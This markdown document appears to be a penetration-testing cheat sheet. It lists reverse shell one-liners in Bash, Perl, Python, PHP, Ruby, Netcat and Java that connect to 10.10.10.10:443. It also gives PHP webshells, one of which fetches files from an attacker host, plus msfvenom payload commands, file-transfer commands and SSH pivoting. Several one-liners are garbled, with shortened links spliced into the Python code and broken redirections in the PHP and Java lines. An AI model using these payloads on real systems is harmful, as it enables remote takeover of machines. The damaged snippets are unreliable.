Always good to look at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
## Reverse shell: One liners

Also use the automatic shell [generator](https://www.revshells.com/)

```bash
ip = "10.10.10.10"
port = 443
```

### Bash

```bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1"
```

### Perl

```perl
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket([http://socket.AF](https://t.co/Me2vkYbgYY)_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=[http://subprocess.call](https://t.co/y7v9y5VORS)(["/bin/sh","-i"]);'
```

### PHP

```php
php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i &3 2>&3");'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",443).to_i;exec sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'
```

### Netcat
Note: `-u` for UDP

```bash
# With -e
nc [-u] 10.10.10.10 443 -e /bin/bash

# Without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [-u] 10.10.10.10 443 > /tmp/f
```

### Java
```java
r = Runtime.getRuntime() 
p = r.exec(["/bin/bash","-c","exec 5/dev/tcp/10.10.10.10/443;cat &5 >&5; done"] as String[]) 
p.waitFor()
```


## PHP Webshells

```php
# Basic. system() or shell_exec() or exec()
# Visit site.com?cmd=id
<?php system($_GET['cmd']);?>

# More functional
<?php 
	$ip = 'http://10.10.14.4/'; # [:port] . Change this 
	# Upload 
	if (isset($_GET['fupload'])) { 
		file_put_contents($_GET['fupload'], file_get_contents($ip . $_GET['fupload'])); 
	}; # Execute code 
	# shell_exec() or system() or exec() 
	if (isset($_GET['cmd'])) { 
		echo "<pre>" . exec($_GET['cmd']) . "</pre>";
	};
?>
```

## Metasploit: System binaries

### Linux Reverse shell

```bash
# Staged
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell

# Stageless
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell
```

### Windows reverse shell

```bash
# Staged
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe

# Stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
```

## Web

### PHP

```bash
msfvenom -p php/reverse_php
```

### ASPX

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o shell.aspx
```

### WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

## Shellcode (Use Python or C)

### Linux
```bash
# Staged
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python

# Stageless
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python
```

### Windows 

```bash
# Staged
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python

# Stageless
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python
```


## Upgrading your shell - Linux

Look at [[CyberCheatSheet/Privilege escalation/Linux#Upgrading your shell - Linux|Linux Privesc guide]]

## File transfers
### Python3

**SENDING END**:
```bash
python3 -m http.server 8080
```

**RECEIVING END:**
```bash
wget $ip:8080/file/path -O out/file
# or
curl $ip:8080/file/path -o out/file
```

### Netcat

**SENDING END**:
```bash
nc -nvlp 8080 < file/path
```

**RECEIVING END**:
```bash
nc -nv $ip 8080 > out/file
```
### TFTP (UDP)

**SENDING END**:
```bash
sudo atftpd --daemon -port 8080 /path/to/serve
```

**RECEIVING END:**
```bash
wget $ip:8080/file/path -O out/file
# or
curl $ip:8080/file/path -o out/file
```
## Port Forwarding (SSH)

In you **HOST**:
```bash
# Local port forwarding: forward local port to remote server
ssh <gateway> -L <local_port_to_listen_to>:<remote_host>:<remote_port>

# Remote port forwarding: Forward remote port to local machine
ssh <gateway> -R <remote_port>:<local_host>:<local_port>

# Dynamic
ssh -D $localport -p $remoteport $user@$ip
## And add following line to `/etc/proxychains4.conf`:
## socks5 127.0.0.1 $localport
## To run commands: 
proxychains -q $cmd
```
